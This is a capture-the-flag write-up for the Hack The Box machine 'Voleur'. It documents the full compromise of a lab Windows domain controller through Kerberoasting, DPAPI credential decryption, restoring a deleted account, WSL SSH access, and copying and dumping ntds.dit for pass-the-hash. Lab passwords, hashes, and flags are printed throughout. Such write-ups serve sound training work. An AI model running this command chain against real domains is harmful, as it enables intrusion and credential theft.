# HTB Write-Up: Voleur

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Voleur) |
| Difficulty | Medium |
| OS | Windows |
| Date | October 24, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — Kerberos-Only SMB Access & Encrypted Spreadsheet](#enumeration-kerberos-only-smb-access-encrypted-spreadsheet)
3. [BloodHound Analysis & Account Restoration](#bloodhound-analysis-account-restoration)
4. [Credential Access — Targeted Kerberoasting (svc\_winrm)](#credential-access-targeted-kerberoasting-svc_winrm)
5. [Credential Access — DPAPI Secrets Extraction (jeremy.combs)](#credential-access-dpapi-secrets-extraction-jeremycombs)
6. [Initial Foothold — WSL SSH Access as svc\_backup](#initial-foothold-wsl-ssh-access-as-svc_backup)
7. [Privilege Escalation — NTDS.dit Extraction & DC Compromise](#privilege-escalation-ntdsdit-extraction-dc-compromise)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.232.130 --ulimit=5000
```

**Notable Open Ports:**

| Port | Service |
| --- | --- |
| 53 | DNS |
| 88 | Kerberos |
| 389 / 3268 | LDAP |
| 445 | SMB |
| 2222 | SSH (non-standard) |
| 5985 | WinRM |
| 9389 | .NET Message Framing |

A Domain Controller for `voleur.htb`. Two things stand out beyond the usual AD spread: **SSH on a non-default port (2222)**, and — as the very first credential test shows — **NTLM authentication is disabled domain-wide**, forcing every interaction through Kerberos.

## Enumeration — Kerberos-Only SMB Access & Encrypted Spreadsheet

### 2.1 — Confirming NTLM Is Disabled

Given credentials (`ryan.naylor:HollowOct31Nyt`) were tried against SMB the normal way:

```bash
netexec smb 10.129.232.130 -u "ryan.naylor" -p "HollowOct31Nyt" --shares
```

```
[-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

`STATUS_NOT_SUPPORTED` here means NTLM itself is rejected domain-wide — Kerberos is the only path in.

### 2.2 — Getting a Kerberos Ticket

The domain was added to `/etc/hosts`, the clock synced, and a TGT requested directly:

```bash
echo "10.129.232.130 voleur.htb dc.voleur.htb" | sudo tee -a /etc/hosts
sudo ntpdate voleur.htb
impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt'
export KRB5CCNAME=ryan.naylor.ccache
```

```
Default principal: ryan.naylor@VOLEUR.HTB
```

### 2.3 — Reaching SMB with the Ticket

**netexec** with `-k` still failed to enumerate shares, so **impacket-smbclient** was used instead, which handled the Kerberos session correctly:

```bash
impacket-smbclient -k -no-pass dc.voleur.htb
```

```
# shares
ADMIN$  C$  Finance  HR  IPC$  IT  NETLOGON  SYSVOL
```

`Finance` and `HR` were access-denied, but **`IT`** was readable:

```
# use IT
# cd First-Line Support
# ls
-rw-rw-rw-      16896  Access_Review.xlsx
# get Access_Review.xlsx
```

### 2.4 — Cracking the Spreadsheet

The file was password-protected. Its hash was extracted and cracked offline:

```bash
office2john Access_Review.xlsx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Office hash
```

**Result:**

```
football1        (Access_Review.xlsx)
```

Opening the spreadsheet with passphrase **`football1`** revealed a table of domain users, roles, and some additional passwords — including later-useful hints about `jeremy.combs` (access to a Software folder) and `svc_backup` ("ask Jeremy").

## BloodHound Analysis & Account Restoration

### 3.1 — Collecting AD Data

BloodHound data was pulled using the Kerberos ticket already in `KRB5CCNAME`:

```bash
bloodhound-python -ns 10.129.232.130 -d voleur.htb -u ryan.naylor -k -c All --zip
```

### 3.2 — Key Findings

- **`jeremy.combs`** — member of **Third-Line Technicians**, has **CanPSRemote** on the DC
- **`svc_ldap`** — has **WriteSPN** on `svc_winrm` (which itself has CanPSRemote on the DC), and is a member of **Restore\_Users**
- **`ryan.naylor`** and **`marie`** — members of **First-Line Technicians**
- **`lacey`** — member of **Second-Line Technicians**

### 3.3 — Restoring a Deleted Account

The spreadsheet had earlier noted that **`todd.wolfe`**'s password was changed and the account removed. `svc_ldap`'s membership in **Restore\_Users** meant it could reverse that — AD's object deletion is typically a soft-delete (tombstone) until garbage collection, and accounts in a restore-capable group can bring a tombstoned object back:

```bash
bloodyAD --host dc.voleur.htb -d voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k set restore 'todd.wolfe'
```

```
[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```

The password found in the spreadsheet (`NightT1meP1dg3on14`) still worked, and a fresh TGT and BloodHound pull were taken as `todd.wolfe` to map what the restored account could reach:

```bash
impacket-getTGT voleur.htb/todd.wolfe:NightT1meP1dg3on14
export KRB5CCNAME=todd.wolfe.ccache
bloodhound-python -ns 10.129.232.130 -d voleur.htb -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -k -c All --zip
```

This confirmed `todd.wolfe` also has **CanPSRemote** rights on the Domain Controller.

## Credential Access — Targeted Kerberoasting (svc\_winrm)

### 4.1 — Diagnosing a Script Bug

Since `svc_ldap` holds **WriteSPN** on `svc_winrm`, a targeted Kerberoasting attack was attempted — temporarily adding an SPN to the account to make it roastable:

```bash
python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' --dc-ip dc.voleur.htb -k --request-user 'svc_winrm'
```

```
[!] Error while anonymous logging into voleur.htb
```

The script's `--dc-ip` flag triggers an anonymous SMB lookup first, to resolve the DC's NetBIOS name before doing anything Kerberos-related. Since anonymous SMB is disabled domain-wide (matching the NTLM lockdown from recon), that lookup fails immediately and the script never reaches the actual Kerberos attack. Passing `--dc-host` instead skips that anonymous SMB step entirely, since the machine name is already known, and goes straight to using the Kerberos ticket already in `KRB5CCNAME`.

`DC` was added to `/etc/hosts` as an additional alias, and the corrected command used:

```
10.129.232.130 voleur.htb dc.voleur.htb DC
```

```bash
python3 targetedKerberoast.py -d voleur.htb --dc-host DC -u svc_ldap@voleur.htb -k
```

This returned TGS hashes for two accounts: **`lacey.miller`** and **`svc_winrm`**.

### 4.2 — Cracking the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=krb5tgs
```

**Result:**

```
AFireInsidedeOzarctica980219afi (?)
```

Recovered credentials: **`svc_winrm:AFireInsidedeOzarctica980219afi`** (the `lacey.miller` hash did not crack against rockyou).

### 4.3 — Shell Access & User Flag

```bash
impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -k svc_winrm.ccache -r voleur.htb
```

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
c4de45831208c7cd61c772c31f190767
```

## Credential Access — DPAPI Secrets Extraction (jeremy.combs)

### 5.1 — Multi-Realm krb5.conf

To keep using `dc.voleur.htb` for SMB (bypassing the anonymous-login requirement that a bare IP would trigger) while juggling tickets across accounts, `/etc/krb5.conf` was kept configured for the domain:

```ini
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  VOLEUR.HTB = {
    kdc = dc.voleur.htb
    admin_server = dc.voleur.htb
  }

[domain_realm]
  .voleur.htb = VOLEUR.HTB
  voleur.htb = VOLEUR.HTB
```

With `todd.wolfe`'s ticket active, share access was re-checked and now included the **Finance** and **HR** shares as well (though not yet usable), confirming the restored account unlocked more than the original `ryan.naylor`:

```bash
netexec smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --shares
```

### 5.2 — Finding DPAPI Artifacts

Browsing the `IT` share as `todd.wolfe`, an **"Archived Users"** folder held a full copy of `todd.wolfe`'s own profile — including the `AppData\Roaming\Microsoft` folder where Windows stores DPAPI-protected secrets:

```bash
impacket-smbclient -k -no-pass dc.voleur.htb
# use IT
# cd Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft
```

Two files mattered: a saved credential blob under **`Credentials`**, and the DPAPI **master key** under `Protect\<SID>` that decrypts it:

```
# cd Credentials
# get 772275FAD58525253490A9B0039791D3
# cd ..\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```

### 5.3 — Decrypting with impacket-dpapi

The master key file is itself encrypted, protected by the user's own password and SID. It was decrypted first:

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

```
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

That decrypted key was then used to unlock the credential blob itself:

```bash
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

```
[CREDENTIAL]
Target      : Domain:target=Jezzas_Account
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Recovered credentials: **`jeremy.combs:qT3V9pLXyN7W4m`** — matching the spreadsheet's earlier hint that Jeremy had access to a "Software" folder.

## Initial Foothold — WSL SSH Access as svc\_backup

### 6.1 — Finding Jeremy's Files

With a ticket for `jeremy.combs`, the IT share showed a folder reserved for Third-Line staff:

```bash
export KRB5CCNAME=jeremy.combs.ccache
impacket-smbclient -k -no-pass dc.voleur.htb
# use IT
# cd Third-Line Support
# mget *
```

```
id_rsa
Note.txt.txt
```

### 6.2 — Reading the Note

```bash
cat Note.txt.txt
```

```
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the
backup tools from Linux.

Please see what you can set up.

Thanks,
Admin
```

This explains the earlier non-standard **SSH port 2222** from recon: it's WSL (Windows Subsystem for Linux) running its own SSH service alongside the Windows host, set up specifically to run backup tooling from the Linux side.

### 6.3 — SSH Access

The recovered `id_rsa` didn't belong to `jeremy.combs` directly — the spreadsheet had noted the `svc_backup` account's description as "ask Jeremy", so the key was tried there instead:

```bash
chmod 600 id_rsa
ssh jeremy.combs@voleur.htb -i id_rsa -p 2222
# Permission denied (publickey).

ssh svc_backup@10.129.232.130 -i id_rsa -p 2222
```

This worked, dropping into the WSL Ubuntu environment running alongside the Windows DC:

```
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
svc_backup@DC:~$ whoami
svc_backup
```

## Privilege Escalation — NTDS.dit Extraction & DC Compromise

### 7.1 — Full Sudo Rights

```bash
sudo -l
```

```
User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Unrestricted, passwordless sudo — a root shell was immediate:

```bash
sudo /bin/bash -p
```

### 7.2 — Finding the Backup Files

There was no `root.txt` in the usual place. Since this account exists specifically for backup tooling, backup-related directories were searched for instead — including across the WSL mount of the Windows C: drive:

```bash
find / -type d -iname "*backup*" 2>/dev/null
```

```
/mnt/c/IT/Third-Line Support/Backups
```

```bash
cd '/mnt/c/IT/Third-Line Support/Backups'
ls
```

```
'Active Directory'   registry
```

The `Active Directory` folder held **`ntds.dit`** — the full AD database, containing every domain account's password hash — and `registry` held the **SYSTEM** and **SECURITY** hives needed to decrypt it.

### 7.3 — Exfiltrating the Files

Files were served from the target and pulled over `scp` through the existing SSH session:

```bash
# On the target:
python3 -m http.server 80

# From Kali:
scp -P 2222 -i id_rsa "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
scp -P 2222 -i id_rsa "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" .
scp -P 2222 -i id_rsa "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
```

### 7.4 — Dumping Domain Hashes

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

### 7.5 — Root Flag via Pass-the-Hash

A TGT was requested directly using the recovered NT hash:

```bash
impacket-getTGT voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1eabcd48509458a4135903c67361dbc4
```
